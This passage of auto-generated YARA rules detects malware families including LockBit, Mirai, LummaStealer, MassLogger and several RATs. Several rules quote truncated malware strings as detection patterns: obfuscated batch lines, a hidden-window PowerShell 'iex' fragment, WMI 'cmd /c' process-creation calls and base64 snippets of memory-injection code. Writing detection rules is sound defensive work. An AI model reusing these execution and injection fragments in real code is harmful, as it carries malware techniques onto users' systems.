      $s4 = "\"5F@^=*:" fullword ascii /* score: '9.00'*/ /* hex encoded string '_' */
      $s5 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "skuddzvk" fullword ascii /* score: '8.00'*/
      $s7 = "fqkjcwss" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LockBit_signature__2 {
   meta:
      description = "_subset_batch - file LockBit(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "90b06f07eb75045ea3d4ba6577afc9b58078eafeb2cdd417e2a88d7ccf0c0273"
   strings:
      $s1 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s2 = "[!] Segmentation fault caught in should_bypass_dir for %s" fullword ascii /* score: '11.00'*/
      $s3 = "[!] Segmentation fault caught in should_bypass_file for %s" fullword ascii /* score: '11.00'*/
      $s4 = "pA[!] Segmentation fault caught in clear_bypass_caches" fullword ascii /* score: '11.00'*/
      $s5 = "siglongjmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 1000KB and
      all of them
}

rule LockBit_signature__4dc06ece {
   meta:
      description = "_subset_batch - file LockBit(signature)_4dc06ece.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4dc06ecee904b9165fa699b026045c1b6408cc7061df3d2a7bc2b7b4f0879f4d"
   strings:
      $s1 = "AWAVAUA" fullword ascii /* reversed goodware string 'AUAVAWA' */ /* score: '16.50'*/
      $s2 = "AWAVAUATA" fullword ascii /* reversed goodware string 'ATAUAVAWA' */ /* score: '16.50'*/
      $s3 = "[!] Segmentation fault caught in should_bypass_dir for %s" fullword ascii /* score: '11.00'*/
      $s4 = "[!] Segmentation fault caught in should_bypass_file for %s" fullword ascii /* score: '11.00'*/
      $s5 = "[!] Segmentation fault caught in clear_bypass_caches" fullword ascii /* score: '11.00'*/
      $s6 = "siglongjmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 1000KB and
      all of them
}

rule Mirai_signature__036428ff {
   meta:
      description = "_subset_batch - file Mirai(signature)_036428ff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "036428ff954806d0815e95f4d64844b462747d5b7b6b7532cebb2cf32267aec5"
   strings:
      $s1 = "(condi/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(condi/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s4 = "__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__0be28d7e {
   meta:
      description = "_subset_batch - file Mirai(signature)_0be28d7e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0be28d7eec1ca34cc28d4fc50abf69e86ec1df26e19731c2429f0938d521b8c5"
   strings:
      $s1 = "(diicot/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(diicot/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s4 = "__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "ropbear" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__118d7546 {
   meta:
      description = "_subset_batch - file Mirai(signature)_118d7546.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "118d7546709f1d4eac356e635d885e8ca435b9b31bcdd906f3110cd251c99942"
   strings:
      $s1 = "(condi/maps) Killed Process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s2 = "(condi/exe) Killed process: %s, PID: %d" fullword ascii /* score: '20.50'*/
      $s3 = "/usr/libexec/openssh/sftp-server" fullword ascii /* score: '17.00'*/
      $s4 = "X__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "vlbad auth_len gid %d str %d auth %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule MetaStealer_signature__05c7df6d575c13faf78878f9450f3b20_imphash__ee683ec2 {
   meta:
      description = "_subset_batch - file MetaStealer(signature)_05c7df6d575c13faf78878f9450f3b20(imphash)_ee683ec2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ee683ec27e4ecc7ab7e10a3dcbea0ef5aad8ece6f2796fc26d175780db5be34a"
   strings:
      $s1 = "msedge_pwa_launcher.exe" fullword wide /* score: '19.00'*/
      $s2 = "MyKp.xYC" fullword ascii /* score: '10.00'*/
      $s3 = "GeTnNvB" fullword ascii /* score: '9.00'*/
      $s4 = "* |X_g" fullword ascii /* score: '9.00'*/
      $s5 = "+ -_HR" fullword ascii /* score: '9.00'*/
      $s6 = "d~o/ZagVs~- " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      all of them
}

rule LummaStealer_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__ccfeab18 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_ccfeab18.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ccfeab18b40409a5f1d14d48e7b4208430b8cda6b6a65a431c2a38aaeadecd10"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = " Install System v8.99.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s6 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s7 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s8 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0" fullword ascii /* score: '13.00'*/
      $s9 = "'Free Time Software Technology Co., Ltd.0" fullword ascii /* score: '11.00'*/
      $s10 = "'Free Time Software Technology Co., Ltd.100." fullword ascii /* score: '11.00'*/
      $s11 = "* aE<q" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__1451f795 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1451f795.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1451f7951868b26715f243678d398422ee55ccafca227f54bfe1a2569ac0fa4b"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s3 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s5 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      all of them
}

rule Mirai_signature__16c334a1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_16c334a1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16c334a1c41874ab9ffc269abb9d1b2feb59e3b739101fe5460159eccb9706f6"
   strings:
      $s1 = "GET /geoip/?res=20&r HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s2 = "No child process" fullword ascii /* score: '15.00'*/
      $s3 = "Host: 1.1.1.1" fullword ascii /* score: '14.00'*/
      $s4 = "No file descriptors available" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule MaksRAT_signature__d7b35d27 {
   meta:
      description = "_subset_batch - file MaksRAT(signature)_d7b35d27.jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d7b35d27c224050bbe9bf37cfc22dc9404efd1544855802eecbd2bb009943e35"
   strings:
      $x1 = ".M....h...4...............!.org/glassfish/grizzly/utils/LoggingFormatter$1.classPK...........[%[Yt~X^...H...M...............!.co" ascii /* score: '45.00'*/
      $x2 = "..7.............l.2.com/sun/jna/platform/win32/COM/COMInvokeException.classPK...........[%[G...........0...............2.com/goo" ascii /* score: '40.00'*/
      $x3 = ".8.org/apache/http/impl/cookie/RFC2965PortAttributeHandler.classPK...........[%[tD\\9........D...............8.org/glassfish/gri" ascii /* score: '39.00'*/
      $x4 = "......O...............J.com/fasterxml/jackson/core/io/doubleparser/JavaBigDecimalFromCharSequence.classPK...........[%[n3.7s...." ascii /* score: '37.00'*/
      $x5 = "..;.............K.#.com/fasterxml/jackson/databind/node/NodeSerialization.classPK...........[%[h...z.......=...............#.org" ascii /* score: '36.00'*/
      $x6 = "..1...............T.org/apache/commons/codec/binary/BinaryCodec.classPK...........[%[.. i........:...............T.com/sun/jna/p" ascii /* score: '36.00'*/
      $x7 = "..k\"..@.............L.c.org/glassfish/grizzly/nio/transport/TCPNIOServerConnection.classPK...........[%[.t.bk...{...6.........." ascii /* score: '35.00'*/
      $x8 = "...:.................org/apache/commons/io/filefilter/DirectoryFileFilter.classPK...........[%[.]{.F.......:.................org" ascii /* score: '34.00'*/
      $x9 = ".........+.............Mu..javax/websocket/CloseReason$CloseCode.classPK...........[%[c...X.......0.............Hv..com/fasterxm" ascii /* score: '33.00'*/
      $x10 = "...F...............6.org/apache/http/impl/cookie/BrowserCompatVersionAttributeHandler.classPK...........[%[lL5.........^........" ascii /* score: '33.00'*/
      $x11 = "..@...............<.com/fasterxml/jackson/databind/ser/std/StdArraySerializers.classPK...........[%[..W.....~...-.............V." ascii /* score: '33.00'*/
      $x12 = "..com/fasterxml/jackson/databind/util/EnumValues.classPK...........[%[..}B....f...B.............;...com/fasterxml/jackson/databi" ascii /* score: '32.00'*/
      $x13 = "f;.com/sun/jna/Native$Buffers.classPK...........[%[..+.....#...A..............g;.org/apache/http/client/protocol/RequestTargetAu" ascii /* score: '32.00'*/
      $x14 = "..@.............t1Y.org/glassfish/grizzly/nio/tmpselectors/TemporarySelectorIO.classPK...........[%[..C.4...D...J..............5" ascii /* score: '32.00'*/
      $x15 = "......>...3.............m...com/google/gson/internal/bind/TypeAdapters$16.classPK...........[%[G~......r.../.................org" ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 26000KB and
      1 of ($x*)
}

rule Mirai_signature__163b7118 {
   meta:
      description = "_subset_batch - file Mirai(signature)_163b7118.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "163b7118d867327e13f601e6fdb8e6330fc7359fec8a5c488b7662a73448f5f9"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule HijackLoader_signature__83adce15 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_83adce15.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "83adce15cb09d2179dc7d3d134078c7db76e26b4b81b774d6163b960442a6b8f"
   strings:
      $s1 = "Redd/SsCustom.dll" fullword ascii /* score: '20.00'*/
      $s2 = "Redd/OmgbkupRes_ENU.dll" fullword ascii /* score: '20.00'*/
      $s3 = "Redd/Turbo-Inj.exe" fullword ascii /* score: '19.00'*/
      $s4 = "* <qE " fullword ascii /* score: '9.00'*/
      $s5 = "* BNu{" fullword ascii /* score: '9.00'*/
      $s6 = "P /y !" fullword ascii /* score: '9.00'*/
      $s7 = "* 0Ts:" fullword ascii /* score: '9.00'*/
      $s8 = ")4{52-D60" fullword ascii /* score: '9.00'*/ /* hex encoded string 'E-`' */
      $s9 = "hbxuagv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 11000KB and
      all of them
}

rule LummaStealer_signature__4e76f8e83a7b4e56a9194f69a1dfbadc_imphash__2740aaac {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_4e76f8e83a7b4e56a9194f69a1dfbadc(imphash)_2740aaac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2740aaaccbef9382423a4a3030a46b744557a78a448b26d67caa5ad6740070ed"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__4e76f8e83a7b4e56a9194f69a1dfbadc_imphash__28294c5a {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_4e76f8e83a7b4e56a9194f69a1dfbadc(imphash)_28294c5a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "28294c5ab2e95309b80dce5934d5a5c9956f077e3d327cca56ddda1043e69125"
   strings:
      $s1 = "mfqgxbv" fullword ascii /* score: '8.00'*/
      $s2 = "BQxP'!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule ImminentRAT_signature_ {
   meta:
      description = "_subset_batch - file ImminentRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "99438d06c279dc2a7e3566100b4eac2b7a4797bbc7f0200ac510028164a78a10"
   strings:
      $x1 = "PrismProcessor.WriteLine(\":: N6hO1uHbVnS94ysXJaO2SibvAFbjcKyGPS6yMHAeEvF3MYLUbRVKmIq/ijhv/8LML2JQ16xLIS2qwja9MWucoPGE6UFfJPf22P" ascii /* score: '56.00'*/
      $x2 = "GetObject(HolographicService).Get(MagneticDatabase).Create('cmd /c ' + SyntheticServer, null, null, null);" fullword ascii /* score: '37.00'*/
      $s3 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%yhrrgtxfe%g%yhrrgtxfe%i%yhrrgtxfe%r%yhrrgtxfe%o%yhrrgtxfe%j%yhrrgtxfe%u%yhrrgt" ascii /* score: '30.00'*/
      $s4 = "PrismProcessor.WriteLine(\"%pbvreqlqdxbpr%%pbvreqlqdxbpr%c%pbvreqlqdxbpr%%pbvreqlqdxbpr%o%pbvreqlqdxbpr%%pbvreqlqdxbpr%p%pbvreql" ascii /* score: '28.00'*/
      $s5 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%hglaklfmx%f%hglaklfmx%r%hglaklfmx%q%hglaklfmx%t%hglaklfmx%p%hglaklfmx%m%hglakl" ascii /* score: '27.00'*/
      $s6 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%swllcxmlx%t%swllcxmlx%o%swllcxmlx%z%swllcxmlx%m%swllcxmlx%u%swllcxmlx%x%swllcx" ascii /* score: '26.00'*/
      $s7 = "PrismProcessor.WriteLine(\"%rgsbhbnhgdysgk%%rgsbhbnhgdysgk%i%rgsbhbnhgdysgk%%rgsbhbnhgdysgk%f%rgsbhbnhgdysgk%%rgsbhbnhgdysgk% %r" ascii /* score: '26.00'*/
      $s8 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%iqskcvqhg%m%iqskcvqhg%e%iqskcvqhg%d%iqskcvqhg%l%iqskcvqhg%v%iqskcvqhg%i%iqskcv" ascii /* score: '25.00'*/
      $s9 = "PrismProcessor.WriteLine(\"set \\\"sourceFile=%scriptPath%%scriptName%\\\"\");" fullword ascii /* score: '25.00'*/
      $s10 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%yuqgcwvsl%j%yuqgcwvsl%o%yuqgcwvsl%e%yuqgcwvsl%m%yuqgcwvsl%w%yuqgcwvsl%l%yuqgcw" ascii /* score: '22.00'*/
      $s11 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%flxcshszk%g%flxcshszk%m%flxcshszk%z%flxcshszk%c%flxcshszk%r%flxcshszk%t%flxcsh" ascii /* score: '22.00'*/
      $s12 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%eloxfpvve%z%eloxfpvve%d%eloxfpvve%u%eloxfpvve%n%eloxfpvve%k%eloxfpvve%n%eloxfp" ascii /* score: '22.00'*/
      $s13 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%xrfofqckh%g%xrfofqckh%v%xrfofqckh%c%xrfofqckh%y%xrfofqckh%q%xrfofqckh%b%xrfofq" ascii /* score: '22.00'*/
      $s14 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%rjnogkhcu%d%rjnogkhcu%b%rjnogkhcu%i%rjnogkhcu%x%rjnogkhcu%x%rjnogkhcu%w%rjnogk" ascii /* score: '22.00'*/
      $s15 = "PrismProcessor.WriteLine(\"!vivsfajfsgwcmpx! \\\"%ivewdktha%y%ivewdktha%s%ivewdktha%x%ivewdktha%d%ivewdktha%i%ivewdktha%h%ivewdk" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule MassLogger_signature_ {
   meta:
      description = "_subset_batch - file MassLogger(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "044d63ab7ef7390e0db6d6809165edaefc81b164e32ccb8f6bc522a746254f3f"
   strings:
      $x1 = ":: b6HmPWEhCqk81+C/i5TmN8VqP2/KgVPckH730krJK7AKYKG0G5T59vaPMeX1sFhOv1krzdduVqAP/5VlCBC4s9btc2gNSQE7xSlqdtPn0lfOCZmIocMJbdtAJD5ra" ascii /* score: '41.00'*/
      $s2 = "!zdmnfeoiapcpnvz! \"%loitjaden%y%loitjaden%e%loitjaden%u%loitjaden%e%loitjaden%t%loitjaden%k%loitjaden%q%loitjaden%i%loitjaden%r" ascii /* score: '19.00'*/
      $s3 = "loitjaden%b%loitjaden%y=-nop -w h -c \"\"iex([Text.Enc\"" fullword ascii /* score: '19.00'*/
      $s4 = "6J1GKHveroziT0x8HY3berhv7aogmDsOqB5ZL6ehpVeYL+hKAMlpmgM8pLhZ2/cCTFerF4dZfcixQfwBcR9VJaPF/vxOGFuc4XH6y9Wkz7nnAPZMruoVEv0hLogY3Epp" ascii /* score: '16.00'*/
      $s5 = "PGOCgZHxHzSNUjzpiSrPJAl/mEdQ0XrNXO/nwEkYtZOhonAQBDLLHLm/kxDOVt7bVvRD7V/6S/hlBFBYpMqJV+5DoWwZI+2Ct3JY6JKE4u2fce3KZI4/+vpmoRpiies8" ascii /* score: '16.00'*/
      $s6 = "+OXXp72om4N4SfkATJotELA3Eu14qxyNgUSeQy8vIee+VFsFIqLj6fNmxe4Cx7mn99xF1Y8HcxYG/iTXnWqjecwWIRcY5xJyTK1S2ixQxMirAe7AQqhp5TSWxUxZGHZK" ascii /* score: '16.00'*/
      $s7 = "/CY3W6uXAxO8/2t+xzI8UJQT8TQEuKo+j6z10QS4uE7tvEKSnx0a/HJG7eo/AJshRkvSJFncxiTuEHbgWWzK7+VWYH6p0CueXTfFjz0pkLPdWbVDV8OunyQqEOxQi+dK" ascii /* score: '16.00'*/
      $s8 = "vLIrC+lYncZjS4KS1k+ewgsXCqYb1wbbES9o3o8XPNY5TWxYicsYNPzBRGDVsTjKVQhKX4c7i85GCDGNyACkucosLdPGRwqEeWDMkUvmODzIclPcj+uYiwOW+bPSEsiB" ascii /* score: '16.00'*/
      $s9 = "TGx4wt14cOpoOrRLwkloDC3vLFGETyTJrXHKHZPTDPGWR6CnfWvHqzmyX0SqB20FMbXuSmt4b3QiEiuJ0c6E3Fl0PNwugTgDVvr5NNbeRiAKHo/YeTZZcuHEuQ5yvQ3/" ascii /* score: '16.00'*/
      $s10 = "AGLHSY/DkxAJ0ac5sYJ61h1Ftpc5OLxLrTzTdH5UWzcNvO5wViSEG8+DSFgEZo+0ian8Ip61flKuKcwC4+da6lGtsYzbQtb7n2TgbWBCgr7Yo+81sCGFWx75C+sHFkKb" ascii /* score: '16.00'*/
      $s11 = "RbNaayYohrGcNc4Jk62xfHlH0spYf/P9sKwt8ab7kjCp0gsU7LH/YDScvDet7uQAOXojndyiaQJdW24srnVw/czeNMM6aL+dIi3T3uXD8vTairozO/BtDs6XTCCtYCsi" ascii /* score: '16.00'*/
      $s12 = "0TR4Bwe495CzwRi2pD2LGpwufoe2viUEivvt2k6s+aQmirCDzAFemAbcdehnBEQoq9vrPGAh1x531flHvaqRbQ7Sv0tdjcvGenngTk/eeIgQeSYATfMz8ghn18fzFMyA" ascii /* score: '16.00'*/
      $s13 = "zclMJAf1HQOAnfYjk9EYelI5OAR8J1gaxt6TBMX74zsMuOQh/VP7jGqmLgndIa7cNomagRiUziBHlRFK+oajcnliaIM9CUr/sJvYAxP33i/uJYLSFafFCKuRyyMTDjyP" ascii /* score: '16.00'*/
      $s14 = "DZ7oT6PHL507hvH1X9w/xippCX0BFhQuCjgZKRvLwDiC1ju7LfRn6pqNfS216uKVRJyKuChVzvK0rFpCxMUpN5g71EyqMS51jRdnwfJQf/SXc2LGuiqYzAaJVEYaCzT8" ascii /* score: '15.00'*/
      $s15 = "c7dJ+YTxj7jrmYUGsC3xZ2ZPKGxFsi113Ub43/kv+OymLS8kN1WvqHnupoYYi6OegMs18zw3KMmCq6cvir9loZgiDvvEKDoqEWfkPICTFkHsMk1Gg2wAwykJm/gTe/el" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x7025 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule MassLogger_signature__9f298889 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_9f298889.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9f298889e338ec83549b41aa0e20713bf17a81afe6dcce141e5085c3a4e2e8af"
   strings:
      $x1 = "GetObject(\"winmgmts:\").Get(\"Win32_Process\").Create \"cmd.exe /c \" & FarmStructure, Null, Null, Null" fullword ascii /* score: '50.00'*/
      $x2 = "re = \"C:\\\\Users\\\\Public\\\\FertilizerPost7827.bat\" : WaterLand = Replace(Replace(Replace(Replace(Replace(Replace(Replace(R" ascii /* score: '36.00'*/
      $x3 = "FarmStructure = \"C:\\\\Users\\\\Public\\\\FertilizerPost7827.bat\"" fullword ascii /* score: '36.00'*/
      $x4 = "StreamArea.WriteLine \":: oFVIe1xTFjL2p2mhyWIWp5+6HENwWY8/OYJF4ss/Il8IGaktPQUoRZNYcv8VWdBwLyS0h5VgYyYVihn+8fofhqlMBe0NnvzJY2yajP" ascii /* score: '34.00'*/
      $x5 = "BridgeShed2319 = Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace" ascii /* score: '32.00'*/
      $s6 = "StreamArea.WriteLine \"!wgtshoqokgwevkd! \"\"%tofcjbzby%y%tofcjbzby%m%tofcjbzby%a%tofcjbzby%p%tofcjbzby%b%tofcjbzby%s%tofcjbzby%" ascii /* score: '22.00'*/
      $s7 = "AdAByAF0AJABBAGQAZAByAGUAcwBzACwAIABbAGkAbgB0AF0AJABTAGkAegBlACwAIABbAGkAbgB0AF0AJABQAHIAbwB0AGUAYwB0AGkAbwBuACwAIABbAHIAZQBmAF0" ascii /* base64 encoded string 't r ] $ A d d r e s s ,   [ i n t ] $ S i z e ,   [ i n t ] $ P r o t e c t i o n ,   [ r e f ]' */ /* score: '21.00'*/
      $s8 = "AYgBsAHkAQgB1AGkAbABkAGUAcgAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAkAGQAZQBsAGUAZwBhAHQAZQBJAGQALAAgACQAZgBhAGw" ascii /* base64 encoded string 'b l y B u i l d e r . D e f i n e D y n a m i c M o d u l e ( $ d e l e g a t e I d ,   $ f a l' */ /* score: '21.00'*/
      $s9 = "AbwB1AHMAZQBJAG4AdgBlAG4AdABvAHIAeQAuAGMAYQByAHAAZQB0AEEAcwBzAGUAbQBiAGwAeQAgAD0AIABHAGUAdAAtAEQAZQBjAG8AZABlAGQAUwB0AHIAaQBuAGc" ascii /* base64 encoded string 'o u s e I n v e n t o r y . c a r p e t A s s e m b l y   =   G e t - D e c o d e d S t r i n g' */ /* score: '21.00'*/
      $s10 = "AIAAgACQAbQBlAG0AbwByAHkATQBhAG4AYQBnAGUAcgAgAD0AIABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHM" ascii /* base64 encoded string '    $ m e m o r y M a n a g e r   =   [ R u n t i m e . I n t e r o p S e r v i c e s . M a r s' */ /* score: '21.00'*/
      $s11 = "AcgB2AGkAYwBlAFAAcgBvAHYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQ" ascii /* base64 encoded string 'r v i c e P r o v i d e r   =   $ m e m M a n a g e r : : R e a d I n t 6 4 ( [ I n t P t r ] $' */ /* score: '21.00'*/
      $s12 = "APQAgAFsAYgB5AHQAZQBbAF0AXQBAACgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACw" ascii /* base64 encoded string '=   [ b y t e [ ] ] @ ( 7 1 , 1 0 1 , 1 1 6 , 8 0 , 1 1 4 , 1 1 1 , 9 9 , 6 5 , 1 0 0 , 1 0 0 ,' */ /* score: '21.00'*/
      $s13 = "AcgBlAHMAcwAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALgBNAGEAawBlAEI" ascii /* base64 encoded string 'r e s s   @ ( [ I n t P t r ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] , [ U I n t 3 2 ] . M a k e B' */ /* score: '21.00'*/
      $s14 = "AJAB2AHQAYQBiAGwAZQAgAD0AIAAkAG0AZQBtAE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQANgA0ACgAWwBJAG4AdABQAHQAcgBdACQAcwBlAHIAdgBpAGM" ascii /* base64 encoded string '$ v t a b l e   =   $ m e m M a n a g e r : : R e a d I n t 6 4 ( [ I n t P t r ] $ s e r v i c' */ /* score: '21.00'*/
      $s15 = "AZQBJAG4AZgBvACwAIABbAEkAbgB0AFAAdAByAF0AJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIABbAGkAbgB0AF0AJABTAGUAcgB2AGkAYwBlAEkAbgBkAGU" ascii /* base64 encoded string 'e I n f o ,   [ I n t P t r ] $ T a r g e t A d d r e s s ,   [ i n t ] $ S e r v i c e I n d e' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x6c50 and filesize < 500KB and
      1 of ($x*) and all of them
}

rule MaksRAT_signature__bec49752 {
   meta:
      description = "_subset_batch - file MaksRAT(signature)_bec49752.jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bec497528a3419725f8ea23f27a82d258153b572fe5545f1ac10c1fce10a3725"
   strings:
      $s1 = "com/sun/jna/win32-aarch64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s2 = "com/sun/jna/win32-x86/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s3 = "com/sun/jna/platform/win32/WinNT$SYSTEM_LOGICAL_PROCESSOR_INFORMATION$AnonymousUnionPayload.class" fullword ascii /* score: '23.00'*/
      $s4 = "com/sun/jna/win32-x86-64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s5 = "com/sun/jna/platform/win32/WinNT$SYSTEM_LOGICAL_PROCESSOR_INFORMATION$AnonymousUnionPayload.classPK" fullword ascii /* score: '23.00'*/
      $s6 = "org/glassfish/grizzly/ProcessorExecutor.classPK" fullword ascii /* score: '20.00'*/
      $s7 = "org/glassfish/grizzly/ProcessorExecutor$1.class" fullword ascii /* score: '20.00'*/
      $s8 = "org/glassfish/grizzly/ProcessorExecutor$1.classPK" fullword ascii /* score: '20.00'*/
      $s9 = "org/glassfish/grizzly/ProcessorExecutor.class" fullword ascii /* score: '20.00'*/
      $s10 = "org/apache/http/impl/client/FutureRequestExecutionService.classPK" fullword ascii /* score: '18.00'*/
      $s11 = "org/apache/http/protocol/RequestTargetHost.class" fullword ascii /* score: '18.00'*/
      $s12 = "org/apache/http/impl/execchain/ServiceUnavailableRetryExec.class" fullword ascii /* score: '18.00'*/
      $s13 = "org/apache/http/impl/client/FutureRequestExecutionService.class" fullword ascii /* score: '18.00'*/
      $s14 = "org/apache/http/impl/execchain/ServiceUnavailableRetryExec.classPK" fullword ascii /* score: '18.00'*/
      $s15 = "org/apache/http/protocol/RequestTargetHost.classPK" fullword ascii /* score: '18.00'*/
   condition:
